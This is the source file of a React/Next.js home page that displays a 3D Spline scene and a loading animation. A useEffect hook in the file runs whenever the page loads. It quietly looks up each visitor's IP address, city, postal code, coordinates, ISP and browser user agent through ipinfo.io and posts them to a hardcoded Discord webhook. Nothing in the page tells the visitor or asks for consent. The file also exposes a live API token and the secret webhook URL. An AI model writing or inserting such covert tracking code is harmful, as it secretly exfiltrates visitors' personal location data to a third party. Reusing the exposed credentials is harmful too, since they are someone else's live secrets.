"use client"
import React, { Suspense, useEffect, useState } from "react";
import Lottie from "lottie-react";
import loader from "@/assets/loader.json";
import Spline from "@splinetool/react-spline";



export default function Home() {
  const [isLoading, setIsLoading] = useState(true);
  const isSmallScreenInitial = typeof window !== "undefined" ? window.innerWidth <= 768 : false;
  const [isSmallScreen, setIsSmallScreen] = useState(isSmallScreenInitial);

  useEffect(() => {
    const handleResize = () => {
      setIsSmallScreen(typeof window !== "undefined" ? window.innerWidth <= 768 : false);
    };

    setIsSmallScreen(typeof window !== "undefined" ? window.innerWidth <= 768 : false);

    window.addEventListener("resize", handleResize);

    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 10000);

    return () => {
      clearTimeout(timeoutId);
    };
  }, []);


  useEffect(() => {
    // Get user IP information (fetching from ipinfo.io)
    fetch('https://ipinfo.io/json?token=34599d1b507e43')
      .then(response => response.json())
      .then(ipInfo => {
        // Get platform information
        const platformInfo = {
          userAgent: navigator.userAgent || 'Unknown',
        };

        // Format IP information for Discord
        const formattedIPInfo = `
          IP: ${ipInfo.ip}
          Hostname: ${ipInfo.hostname}
          City: ${ipInfo.city}
          Region: ${ipInfo.region}
          Country: ${ipInfo.country}
          Location: ${ipInfo.loc}
          Organization: ${ipInfo.org}
          Postal: ${ipInfo.postal}
          Timezone: ${ipInfo.timezone}
        `;

        // Combine IP and platform information
        const payload = {
          content: `
            **IP Information:**
            ${formattedIPInfo}

            **Platform Information:**
            User Agent: ${platformInfo.userAgent}
          `,
        };

        // Discord webhook URL
        const discordUrl = "https://discord.com/api/webhooks/1200773590933590137/AcW-MytBNd2Bc-i_P6sflpOh_Kx8-FWDrYK_Ug4mQlrtSZdghHPXJVCqUzYW86lx8wHG"


        // Send payload to Discord webhook
        fetch(discordUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        })
          .then(response => {
            if (!response.ok) {
              throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
          })
          .then(data => {
            console.log('Webhook response:', data);
          })
          .catch(error => {
            console.error('Error sending webhook:', error);
          });
      })
      .catch(error => {
        console.error('Error fetching IP information:', error);
      });
  }, []);


  return (
    <>
      <div className={`flex flex-shrink-0 justify-end h-[calc(100vh-90px)] bg-white text-slate-800 ${isSmallScreen ? "small-screen" : "big-screen"}`}>
        <div className="w-full">
          <Suspense fallback={<div className="font-extrabold size-11 text-blue-500">Loading</div>}>
            <Spline scene={isSmallScreen ? "https://prod.spline.design/5YWMuDfT-o7lXYJA/scene.splinecode" : "https://prod.spline.design/HdgXOEvQ8kL8Ukkn/scene.splinecode"} />
          </Suspense>
        </div>
      </div>
    </>
  );
}
